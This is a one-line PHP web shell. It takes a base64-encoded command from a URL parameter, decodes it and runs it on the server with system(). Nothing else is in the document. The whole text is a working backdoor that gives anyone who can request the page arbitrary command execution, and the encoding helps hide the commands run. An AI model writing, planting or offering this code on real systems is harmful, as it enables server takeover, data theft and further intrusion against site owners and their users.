<?php system(base64_decode($_GET['cmd'])); ?>
